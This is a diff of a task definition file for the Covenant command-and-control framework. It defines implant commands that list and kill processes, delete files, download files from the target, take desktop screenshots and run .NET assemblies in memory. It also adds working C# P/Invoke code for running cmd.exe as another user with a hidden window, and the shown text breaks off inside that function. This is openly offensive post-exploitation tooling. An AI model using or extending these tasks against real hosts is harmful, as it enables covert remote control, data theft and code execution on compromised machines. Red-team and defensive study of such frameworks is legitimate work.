+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: ps
+  Aliases: []
+  Description: List running processes.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: ps"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: ProcessList
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: kill
+  Aliases: []
+  Description: Kill a process by PID.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: kill <pid>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Kill
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Pid
+    Value: ''
+    DefaultValue: ''
+    Description: Process ID to kill.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: mkdir
+  Aliases: []
+  Description: Create a directory.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: mkdir <path>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: CreateDirectory
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Path
+    Value: ''
+    DefaultValue: ''
+    Description: Directory path to create.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: rm
+  Aliases: []
+  Description: Delete a file or directory.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: rm <path>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Delete
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Path
+    Value: ''
+    DefaultValue: ''
+    Description: Path to file or directory to delete.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: cp
+  Aliases: []
+  Description: Copy a file.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: cp <source> <destination>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Copy
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: Source
+    Value: ''
+    DefaultValue: ''
+    Description: Source file path.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  - Name: Destination
+    Value: ''
+    DefaultValue: ''
+    Description: Destination file path.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: download
+  Aliases: []
+  Description: Download a file from the target.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: download <filepath>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Download
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: FileName
+    Value: ''
+    DefaultValue: ''
+    Description: Remote file path to download.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: upload
+  Aliases: []
+  Description: Upload a file to the target.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: upload <filepath> <filecontent>"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  - NetCore31
+  Code: ''
+  TaskingType: Upload
   UnsafeCompile: false
   TokenTask: false
   Options:
@@ -529,642 +1435,1793 @@
     FileOption: true
   ReferenceSourceLibraries: []
   ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
   - Name: mscorlib.dll
     Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
     DotNetVersion: Net35
   - Name: System.dll
     Location: net35\System.dll
     DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
   EmbeddedResources: []
-- Name: WhoAmI
+- Name: screenshot
   Aliases: []
-  Description: Gets the username of the currently used/impersonated token.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.Security.Principal;
-
-    public static class Task
-    {
-        public static string Execute()
-        {
-            try
-            {
-                return WindowsIdentity.GetCurrent().Name;
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options: []
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  EmbeddedResources: []
-- Name: GetCurrentDirectory
-  Aliases:
-  - pwd
-  Description: Get the Grunt's Current Working Directory
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-
-    public static class Task
-    {
-        public static string Execute()
-        {
-            try
-            {
-                return Directory.GetCurrentDirectory();
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options: []
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  EmbeddedResources: []
-- Name: ChangeDirectory
-  Aliases:
-  - cd
-  Description: Change the current directory.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-
-    using SharpSploit.Enumeration;
-
-    public static class Task
-    {
-        public static string Execute(string Directory)
-        {
-            try
-            {
-                Host.ChangeCurrentDirectory(Directory);
-                return Host.GetCurrentDirectory();
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: Directory
-    Value: .
-    DefaultValue: ''
-    Description: Directory to change to.
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: true
-    FileOption: false
-  ReferenceSourceLibraries:
-  - Name: SharpSploit
-    Description: SharpSploit is a library for C# post-exploitation modules.
-    Location: SharpSploit\SharpSploit\
-    Language: CSharp
-    CompatibleDotNetVersions: &o0
-    - Net35
-    - Net40
-    ReferenceAssemblies:
-    - Name: System.Management.Automation.dll
-      Location: net35\System.Management.Automation.dll
-      DotNetVersion: Net35
-    - Name: System.Management.dll
-      Location: net40\System.Management.dll
-      DotNetVersion: Net40
-    - Name: System.Management.Automation.dll
-      Location: net40\System.Management.Automation.dll
-      DotNetVersion: Net40
-    - Name: System.IdentityModel.dll
-      Location: net40\System.IdentityModel.dll
-      DotNetVersion: Net40
-    - Name: System.dll
-      Location: net40\System.dll
-      DotNetVersion: Net40
-    - Name: System.DirectoryServices.dll
-      Location: net40\System.DirectoryServices.dll
-      DotNetVersion: Net40
-    - Name: System.Core.dll
-      Location: net40\System.Core.dll
-      DotNetVersion: Net40
-    - Name: mscorlib.dll
-      Location: net40\mscorlib.dll
-      DotNetVersion: Net40
-    - Name: System.Management.dll
-      Location: net35\System.Management.dll
-      DotNetVersion: Net35
-    - Name: mscorlib.dll
-      Location: net35\mscorlib.dll
-      DotNetVersion: Net35
-    - Name: System.Core.dll
-      Location: net35\System.Core.dll
-      DotNetVersion: Net35
-    - Name: System.DirectoryServices.dll
-      Location: net35\System.DirectoryServices.dll
-      DotNetVersion: Net35
-    - Name: System.dll
-      Location: net35\System.dll
-      DotNetVersion: Net35
-    - Name: System.IdentityModel.dll
-      Location: net35\System.IdentityModel.dll
-      DotNetVersion: Net35
-    EmbeddedResources: []
-  ReferenceAssemblies: []
-  EmbeddedResources: []
-- Name: ReadTextFile
-  Aliases:
-  - cat
-  Description: Read a text file on disk.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-
-    public static class Task
-    {
-        public static string Execute(string Path)
-        {
-            try
-            {
-                return File.ReadAllText(Path);
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: Path
-    Value: ''
-    DefaultValue: ''
-    Description: Path to the file.
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: true
-    FileOption: false
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  EmbeddedResources: []
-- Name: CreateDirectory
-  Aliases:
-  - mkdir
-  Description: Creates all directories and subdirectories in the specified path unless they already exist.
+  Description: Take a screenshot of the desktop.
   Author:
-      Name: Daniel Duggan
-      Handle: _RastaMouse
-      Link: https://twitter.com/_RastaMouse
-  Help:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: screenshot"
   Language: CSharp
   CompatibleDotNetVersions:
   - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-
-    public static class Task
-    {
-        public static string Execute(string Path)
-        {
-            try
-            {
-                var directory = Directory.CreateDirectory(Path);
-                return directory.FullName + " created.";
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: Path
-    Value: ''
-    DefaultValue: ''
-    Description: The directory to create.
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: true
-    FileOption: false
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  EmbeddedResources: []
-- Name: Delete
-  Aliases:
-  - rm
-  - del
-  Description: Delete a file or directory.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-
-    public static class Task
-    {
-        public static string Execute(string Path)
-        {
-            try
-            {
-                if (File.Exists(Path))
-                {
-                    File.Delete(Path);
-                    return $"File {Path} deleted.";
-                }
-    			      else if (Directory.Exists(Path))
-                {
-                    Directory.Delete(Path, true);
-                    return $"Directory {Path} deleted.";
-                }
-                else
-                {
-                    return $"{Path} does not exist.";
-                }
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: Path
-    Value: ''
-    DefaultValue: ''
-    Description: The path of the file or directory to delete.
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: true
-    FileOption: false
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  EmbeddedResources: []
-- Name: Copy
-  Aliases:
-  - cp
-  Description: Copy a file from one location to another.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.IO;
-
-    public static class Task
-    {
-        public static string Execute(string Source, string Destination)
-        {
-            try
-            {
-                File.Copy(Source, Destination);
-                return "Successfully copied file from: " + Source + " to: " + Destination;
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: Source
-    Value: ''
-    DefaultValue: ''
-    Description: Source file to copy
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: true
-    FileOption: false
-  - Name: Destination
-    Value: .
-    DefaultValue: ''
-    Description: Destination to copy file to.
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: true
-    FileOption: false
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  EmbeddedResources: []
-- Name: Kill
-  Aliases: []
-  Description: Kills the process of a given Process ID.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
-  Code: |
-    using System;
-    using System.Diagnostics;
-
-    public static class Task
-    {
-        public static string Execute(string ProcessId)
-        {
-            try
-            {
-                int pid = int.Parse(ProcessId);
-                using (var process = Process.GetProcessById(pid))
-                {
-                    string processName = process.ProcessName;
-                    process.Kill();
-    				        if (process.HasExited)
-                    {
-                        return $"Process ID {pid} ({processName}) killed.";
-                    }
-                    else
-                    {
-                        return $"Could not kill Process ID {pid} ({processName})";
-                    }
-                }
-            }
-            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
-        }
-    }
-  TaskingType: Assembly
-  UnsafeCompile: false
-  TokenTask: false
-  Options:
-  - Name: ProcessID
-    Value: ''
-    DefaultValue: ''
-    Description: The Process ID of the process to kill.
-    SuggestedValues: []
-    Optional: false
-    DisplayInCommand: true
-    FileOption: false
-  ReferenceSourceLibraries: []
-  ReferenceAssemblies:
-  - Name: System.dll
-    Location: net40\System.dll
-    DotNetVersion: Net40
-  - Name: System.Core.dll
-    Location: net40\System.Core.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net40\mscorlib.dll
-    DotNetVersion: Net40
-  - Name: mscorlib.dll
-    Location: net35\mscorlib.dll
-    DotNetVersion: Net35
-  - Name: System.Core.dll
-    Location: net35\System.Core.dll
-    DotNetVersion: Net35
-  - Name: System.dll
-    Location: net35\System.dll
-    DotNetVersion: Net35
-  EmbeddedResources: []
-- Name: SharpShell
-  Aliases: []
-  Description: Execute custom c# code.
-  Author: 
-      Name: Ryan Cobb
-      Handle: cobbr_io
-      Link: https://twitter.com/cobbr_io
-  Help: 
-  Language: CSharp
-  CompatibleDotNetVersions:
-  - Net35
-  - Net40
+  - Net45
+  - Net48
   Code: ''
+  TaskingType: Screenshot
+  UnsafeCompile: false
+  TokenTask: false
+  Options: []
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies:
+  - Name: mscorlib.dll
+    Location: net35\mscorlib.dll
+    DotNetVersion: Net35
+  - Name: System.dll
+    Location: net35\System.dll
+    DotNetVersion: Net35
+  - Name: System.Core.dll
+    Location: net35\System.Core.dll
+    DotNetVersion: Net35
+  - Name: mscorlib.dll
+    Location: net40\mscorlib.dll
+    DotNetVersion: Net45
+  - Name: System.dll
+    Location: net40\System.dll
+    DotNetVersion: Net45
+  - Name: System.Core.dll
+    Location: net40\System.Core.dll
+    DotNetVersion: Net45
+  - Name: mscorlib.dll
+    Location: net48\mscorlib.dll
+    DotNetVersion: Net48
+  - Name: System.dll
+    Location: net48\System.dll
+    DotNetVersion: Net48
+  - Name: System.Core.dll
+    Location: net48\System.Core.dll
+    DotNetVersion: Net48
+  EmbeddedResources: []
+- Name: assembly
+  Aliases: []
+  Description: Execute a .NET assembly in memory (built-in handler).
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: assembly /assemblyname:name /parameters:\"args\""
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: ''
+  TaskingType: ExecuteAssembly
+  UnsafeCompile: false
+  TokenTask: false
+  Options:
+  - Name: AssemblyBytes
+    Value: ''
+    DefaultValue: ''
+    Description: Base64 encoded assembly bytes.
+    SuggestedValues: []
+    Optional: false
+    DisplayInCommand: false
+    FileOption: true
+  - Name: Parameters
+    Value: ''
+    DefaultValue: ''
+    Description: Command-line arguments to pass to the assembly.
+    SuggestedValues: []
+    Optional: true
+    DisplayInCommand: true
+    FileOption: false
+  ReferenceSourceLibraries: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
+
+# ============================================
+# EXECUTION TASKS (P/Invoke implementations)
+# ============================================
+
+- Name: shellrunas
+  Aliases: []
+  Description: Execute a shell command as another user using P/Invoke CreateProcessWithLogonW.
+  Author:
+      Name: Covenant
+      Handle:
+      Link: https://github.com/cobbr/Covenant
+  Help: "Usage: shellrunas /command:\"whoami\" /username:admin /domain:. /password:pass123"
+  Language: CSharp
+  CompatibleDotNetVersions:
+  - Net35
+  - Net45
+  - Net48
+  Code: |
+    using System;
+    using System.IO;
+    using System.Text;
+    using System.Runtime.InteropServices;
+
+    public static class Task
+    {
+        public static Stream OutputStream { get; set; }
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+        private static extern bool CreateProcessWithLogonW(
+            string lpUsername, string lpDomain, string lpPassword,
+            uint dwLogonFlags, string lpApplicationName, string lpCommandLine,
+            uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
+            ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(IntPtr hObject);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        private struct STARTUPINFO
+        {
+            public int cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public int dwX, dwY, dwXSize, dwYSize;
+            public int dwXCountChars, dwYCountChars, dwFillAttribute;
+            public int dwFlags;
+            public short wShowWindow, cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput, hStdOutput, hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess, hThread;
+            public int dwProcessId, dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public bool bInheritHandle;
+        }
+
+        private const uint LOGON_WITH_PROFILE = 0x00000001;
+        private const uint CREATE_NO_WINDOW = 0x08000000;
+        private const int STARTF_USESTDHANDLES = 0x00000100;
+        private const uint HANDLE_FLAG_INHERIT = 0x00000001;
+
+        public static string Execute(string Command, string Username, string Domain, string Password)
+        {
+            try
+            {
+                IntPtr hReadPipe, hWritePipe;
+                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
+                sa.nLength = Marshal.SizeOf(sa);
+                sa.bInheritHandle = true;
+                sa.lpSecurityDescriptor = IntPtr.Zero;
+
+                if (!CreatePipe(out hReadPipe, out hWritePipe, ref sa, 0))
+                    return "Failed to create pipe. Error: " + Marshal.GetLastWin32Error();
+
+                SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
+
+                STARTUPINFO si = new STARTUPINFO();
+                si.cb = Marshal.SizeOf(si);
+                si.dwFlags = STARTF_USESTDHANDLES;
+                si.hStdOutput = hWritePipe;
+                si.hStdError = hWritePipe;
+                si.hStdInput = IntPtr.Zero;
+
+                PROCESS_INFORMATION pi;
+                string cmdLine = "cmd.exe /c " + Command;
+
+                bool success = CreateProcessWithLogonW(
+                    Username, Domain, Password,
+                    LOGON_WITH_PROFILE, null, cmdLine,
+                    CREATE_NO_WINDOW, IntPtr.Zero, null,
+                    ref si, out pi);
+
+                CloseHandle(hWritePipe);
+
+                if (!success)
+                    return "CreateProcessWithLogonW failed. Error: " + Marshal.GetLastWin32Error();
+
